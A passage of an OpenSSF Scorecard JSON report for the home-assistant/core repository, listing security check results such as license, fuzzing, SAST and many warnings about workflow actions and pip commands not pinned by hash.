                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.md:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE.md:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 13 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/builder.yml:487"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:97: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:108: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:119: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:178: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:193: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:200: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:245: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:259: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:266: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:282: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:285: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:292: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:301: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:324: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:327: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:333: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:340: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:454: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:457: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:462: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/builder.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/builder.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/builder.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1296: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1299: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1305: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1357: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1364: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:553: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:556: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:562: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:714: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:717: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:723: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:838: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:841: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:847: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:859: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1245: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1247: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:1252: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:469: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:472: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:485: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:494: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:624: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:627: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:633: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:645: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:902: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:905: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:911: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:924: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:960: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:967: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:280: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:282: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:289: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:298: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:320: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:322: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:329: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:338: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:360: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:362: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:369: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:378: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:450: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:455: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1022: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1025: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1031: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1086: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1094: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:96: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:114: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:129: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:586: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:589: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:595: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:667: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:670: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:676: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:759: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:762: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:775: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:783: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:234: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:237: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:243: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:259: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1150: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1153: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1159: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1215: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1223: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1383: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:1385: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:1390: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/ci.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/codeql.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/codeql.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/codeql.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/lock.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/lock.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/stale.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/stale.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/stale.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/translations.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/translations.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/translations.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/translations.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/wheels.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:82: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:102: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:119: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:122: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:127: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/wheels.yml:138: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:163: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:166: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:171: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/wheels.yml:176: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/wheels.yml:211: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/wheels.yml:226: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/wheels.yml:240: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/wheels.yml:254: update your workflow using https://app.stepsecurity.io/secureworkflow/home-assistant/core/wheels.yml/dev?enable=pin",
                        "Warn: containerImage not pinned by hash: Dockerfile:5",
                        "Warn: containerImage not pinned by hash: Dockerfile.dev:1: pin your Docker image by updating mcr.microsoft.com/devcontainers/python:1-3.12 to mcr.microsoft.com/devcontainers/python:1-3.12@sha256:6df2043e0cc9f73751c605aa101aafdd74b7b1cc52b7510b729f085e21ade8cd",
                        "Warn: containerImage not pinned by hash: script/hassfest/docker/Dockerfile:4: pin your Docker image by updating python:3.12-alpine to python:3.12-alpine@sha256:38e179a0f0436c97ecc76bcd378d7293ab3ee79e4b8c440fdc7113670cb6e204",
                        "Warn: pipCommand not pinned by hash: Dockerfile:15",
                        "Warn: pipCommand not pinned by hash: Dockerfile.dev:39",
                        "Warn: pipCommand not pinned by hash: script/setup:29",
                        "Warn: pipCommand not pinned by hash: .github/workflows/builder.yml:476",
                        "Warn: pipCommand not pinned by hash: .github/workflows/builder.yml:129",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:528",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:255",
                        "Warn: pipCommand not pinned by hash: .github/workflows/wheels.yml:49",
                        "Info:   2 out of 105 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   4 out of  31 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   3 containerImage dependencies pinned",
                        "Info:   0 out of   8 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 7,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/home-assistant/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/home-assistant/.github/SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: github.com/home-assistant/.github/SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/builder.yml:315",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/builder.yml:491",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/builder.yml:84",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/builder.yml:215",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql.yml:18",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql.yml:19",
